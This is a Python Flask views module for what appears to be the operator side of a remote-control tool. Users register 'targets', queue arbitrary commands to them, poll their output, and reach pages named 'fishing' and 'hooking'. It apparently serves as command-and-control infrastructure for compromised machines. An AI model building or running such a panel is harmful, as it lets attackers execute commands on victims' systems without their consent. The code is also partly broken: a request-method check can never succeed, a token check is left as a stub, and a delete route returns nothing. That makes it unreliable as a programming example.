from flask import render_template, url_for, Blueprint, request, session, flash, redirect
from sqlalchemy.orm import sessionmaker

from db.modle import Users, APICommand, APILink, Fishing, Hooking, Targets, Instraction, ApiToken
from db.mange_db import config, _create_engine
from utility.email_temp import email_temp
from utility.processer import log, getlist, readFromJson, delete_data

emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

view = Blueprint("view", __name__, template_folder="templates")


@view.route("/dashboard")
def dashboard():
    """
    Render the dashboard page for the logged-in user.
    Displays targets associated with the user's email.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        email = session['email']
        print(email)
        targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
        _targets = []
        for target in targets:
            target_ = readFromJson()['target-info'][target[0]]
            if '127.0.0.1' in target_['ip']:
                conn = 'local'
            elif '192.168' in target_['ip']:
                conn = 'wifi'
            else:
                # , mdi mdi-ethernet-cable
                conn = 'ethernet'
            _targets.append((target_, conn, target[0]))

        if request.method != 'GET':
            return redirect(url_for('event.page_404'))
        return render_template('dashboard.html', targets=_targets)
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/api_command/<targetName>", methods=['GET', 'POST'])
def api_command(targetName=None):
    """
    Handle API command operations for a specific target.
    GET: Show command history and output for the target.
    POST: Add a new command for the target.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        if targetName is not None:
            try:
                if request.method == 'GET':

                    targets = getlist(_session.query(Targets).filter_by(target_name=targetName).all(), sp=',')
                    instraction = getlist(_session.query(Instraction).filter_by(target_name=targetName).all(), sp=',')
                    if len(targets) != 0 and len(instraction) != 0:
                        _session.query(Instraction).filter_by(target_name=targetName,instraction=config.INSTRACTION[0]).update({
                            'stutas': config.STUTAS[0]
                        })
                        _session.commit()
                        output = readFromJson()['output'][targetName]
                        cmd = getlist(_session.query(APICommand).filter_by(target_name=targetName).all(), sp=',')
                        return render_template('api_command.html',cmd=cmd ,output=output)
                    else:
                        flash(f'No such a target {targetName}')
                        return redirect(request.referrer)
            
                elif request.method == 'POST':

                    CMD = request.json.get('input')
                    ID = config.ID(n=7)
                    print(targetName)
                    add_cmd = APICommand(
                        ID, session['email'],
                        targetName, CMD, config.STUTAS[1]
                    )
                    _session.add(add_cmd)
                    _session.commit()

                    return {
                            'message': 'command saved successfully',
                            'id': ID
                        }, 200
            
            except Exception as e:
                print(e)
                _session.rollback()
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return redirect(url_for('event.page_500'))
            finally:
                _session.close()
        else:
            flash('pleas provid target name')
            return redirect(url_for("view.profile")) 

    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route('/check_commads_updates/<target_name>', methods=['GET'])
def check_commads_updates(target_name):
    """
    Check for updates to API commands for a given target.
    Returns new commands and their output if available.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            cmd_rows = _session.query(APICommand).filter_by(
                target_name=target_name,
                condition=config.STUTAS[0]  # Active commands
            ).all()

            if cmd_rows:
                payload = [{'cmd': row.cmd, 'id': row.ID, 'output': readFromJson()['output'][target_name][row.ID]} for row in cmd_rows]
                return {'event': 'new_message', 'payload': payload}, 200
            else:
                return {'payload': []}, 200

        except Exception as e:
            log(f'[ERROR ROUTE] : {request.endpoint} error: {e}')
            _session.rollback()
            return {'error': 'Server side Error'}, 500

        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route('/api_command/delete',methods=['POST'])
def delete_command():
    """
    Delete an API command for a given target and command ID.
    Only accessible to authenticated users.
    """
    if "email" in session:
        if request.method != "POST":
            return redirect(url_for('event.page_404'))
        target_name = request.json.get('target_name')
        ID = request.json.get('id')
        deleted_data = delete_data(target_name,ID)

    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route('/api_command/api/<targetName>')
def api_command_(targetName):
    """
    Return all API commands for the given target and logged-in user.
    Returns JSON response.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        try:
            apiCommand = getlist(_session.query(APICommand).filter_by(email=session['email'], target_name=targetName).all(), sp=',')
            return {'allCommand': apiCommand}, 200
        
        except Exception as e:

            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            _session.rollback()
            return {'error': 'Server side Error'}, 500
        
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))

@view.route("/socket/<target_name>")
def socket(target_name=None):
    """
    Render the socket page for a given target.
    Handles token verification if POST data is provided.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        if request == "POST":
            token = request.json.get('token')
            is_connect = request.json.get('is_connect')
            check_token = getlist(_session.query(ApiToken).filter_by(user_email=session['email']).all(), sp=',')[0]
            if token == check_token[1]:
                ...
        targets = getlist(_session.query(Targets).filter_by(target_name=target_name).all(), sp=',')
        instraction = getlist(_session.query(Instraction).filter_by(target_name=target_name).all(), sp=',')
        if len(targets) != 0 and len(instraction) != 0:
            _session.query(Instraction).filter_by(target_name=target_name,instraction=config.INSTRACTION[1]).update({
                'stutas': config.STUTAS[0]
            })
        _session.commit()
        return render_template('socket.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/api_link", methods=["GET", "POST"])
def api_link():
    """
    Manage API links for the logged-in user.
    GET: Show all API links and available targets.
    POST: Add a new API link.
    Redirects to login if the user is not authenticated.
    """
    if "email" not in session:
        flash("You must login first")
        return redirect(url_for("public.login"))

    if request.method == "POST":
        try:
            new_link = APILink(
                ID=config.ID(),
                email=session["email"],
                target_name=request.form.get("target_name"),
                link=request.form.get("link"),
                action_type=request.form.get("action_type"),
                condition=int(request.form.get("condition", 0))
            )
            _session.add(new_link)
            _session.commit()
            return redirect(url_for("view.api_link"))
        
        except Exception as e:
            print(e)
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()

    links = _session.query(APILink).filter_by(email=session["email"]).all()
    targetInfo = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
    targets = [target[0] for target in targetInfo]
    print(targets)
    return render_template("api_link.html", links=links, targets=targets)


@view.route("/api_link_delete/<ID>")
def link_delete(ID=None):
    """
    Delete an API link by its ID for the logged-in user.
    Only accessible via GET method.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        if ID:
            if request.method != 'GET':
                flash(f'unknown method {request.method}')
                return redirect(request.referrer)
            try:
                link = getlist(_session.query(APILink).filter_by(ID=ID).all(),sp=',')
                print(link)
                if link:
                    link_ = _session.query(APILink).filter_by(ID=ID).first()
                    _session.delete(link_)
                    _session.commit()
                    flash(f'deleleted sucssesfuly {link[0][3]}')
                    return {"message": "Deleted succsessfully"},200
            except Exception as e:
                print(str(e))
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return {"message": "Somting went wrong"},500
            finally:
                _session.close()
        else:
            flash('unkown link')
            return redirect(request.referrer)
    else:
        flash("You must login first")
        return redirect(url_for("public.login"))


@view.route('/api_link_update/<ID>',methods=['POST'])
def link_update(ID):
    """
    Update an existing API link by its ID.
    Only accessible to authenticated users via POST.
    """
    if 'email' in session:
        if request.method == 'POST':
            try:
                _session.query(APILink).filter_by(ID=ID).update({
                    'target_name': request.form['target_name'],
                    'link': request.form['link'],
                    'action_type': request.form['action_type']
                })
                _session.commit()
                return redirect(request.referrer)
            except Exception as e:
                print(e)
                _session.rollback()
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return redirect(url_for('event.page_500'))
        else:
            return redirect(request.referrer)
    else:
        return redirect(url_for('public.login'))


@view.route("/fishing")
def fishing():
    """
    Render the fishing page for the logged-in user.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        return render_template('api_link.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/hooking")
def hooking():
    """
    Render the hooking page for the logged-in user.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        return render_template('api_link.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/code")
def code():
    """
    Render the code page for the logged-in user.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        return render_template('code.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/settings",methods=['POST','GET'])
def setting():
    """
    Render the settings page for the logged-in user.
    Redirects to login if the user is not authenticated.
    """
    if "email" in session:
        return render_template('setting.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))
